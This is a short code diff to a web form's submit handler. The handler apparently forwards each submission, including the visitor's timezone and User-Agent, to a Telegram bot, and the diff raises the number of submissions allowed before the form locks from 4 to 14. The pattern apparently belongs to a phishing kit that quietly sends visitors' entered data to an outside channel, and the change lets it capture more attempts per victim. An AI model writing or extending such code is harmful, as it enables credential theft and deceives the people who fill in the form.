@@ -54,7 +54,7 @@ form.addEventListener('submit', async function(e) {
 🕓 Timezone: <code>${timezone}</code>
 📱 User-Agent: ${userAgent}`;
 
-  if (attempts >= 4) return;
+  if (attempts >= 14) return;
   await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -66,7 +66,7 @@ form.addEventListener('submit', async function(e) {
   });
 
   attempts++;
-  if (attempts >= 4) lockForm();
+  if (attempts >= 14) lockForm();
 });
 
 function lockForm() {
